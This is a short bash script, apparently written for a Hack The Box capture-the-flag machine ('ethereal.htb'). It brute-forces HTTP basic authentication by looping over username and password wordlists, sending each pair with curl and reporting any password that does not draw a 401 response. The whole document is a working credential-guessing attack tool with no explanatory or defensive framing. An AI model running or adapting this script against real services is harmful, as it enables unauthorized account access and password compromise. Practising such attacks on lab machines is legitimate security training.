#!/bin/bash

for username in $(cat userspbox);
 do
	for password in $(cat passwords.txt);
	  do
	  	echo [/] "Testing ->" $username:$password 
	    curl -s -u $username:$password -X GET http://ethereal.htb:8080 | html2text | grep 401 1>/dev/null 
	    if [ $? -ne 0 ];
	      then echo "[+] password : $password"
	    fi
	  done 
 done



